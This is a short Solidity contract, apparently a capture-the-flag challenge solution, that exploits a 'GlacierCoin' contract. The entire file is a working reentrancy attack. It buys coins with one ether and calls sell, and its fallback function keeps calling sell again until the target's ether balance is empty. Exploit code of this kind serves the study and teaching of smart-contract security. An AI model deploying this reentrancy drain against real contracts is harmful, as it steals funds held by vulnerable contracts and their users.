// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.19;

import "./Challenge.sol";

/**
 * @title Attack
 * @dev This contract is designed to demonstrate an attack on the GlacierCoin contract.
 */
contract Attack {
    // Instance of GlacierCoin to interact with.
    GlacierCoin public coin;

    /**
     * @dev Constructor that initializes the Attack contract.
     *      It requires 1 ether to be sent while deploying the contract.
     * @param addr Address of the GlacierCoin contract to attack.
     */
    constructor(address addr) payable {
        // Ensure exactly 1 ether is sent to fund the attack.
        require(msg.value == 1 ether, "Attack: Must send exactly 1 ether");

        // Initialize the GlacierCoin instance.
        coin = GlacierCoin(addr);
    }

    /**
     * @dev Initiates the attack on the GlacierCoin contract.
     *      It first buys coins using the ether provided and then attempts to sell them.
     */
    function initAttack() public {
        // Buy coins with the ether sent to this contract.
        coin.buy{value: 1 ether}();

        // Attempt to sell the coins.
        coin.sell(1 ether);
    }

    /**
     * @dev Fallback function to receive ether.
     *      If the GlacierCoin contract still has a balance, it attempts to sell more coins.
     */
    fallback() external payable {
        // Check if the GlacierCoin contract still holds ether.
        if (address(coin).balance > 0) {
            // Continue the attack by selling coins.
            coin.sell(1 ether);
        }
    }
}
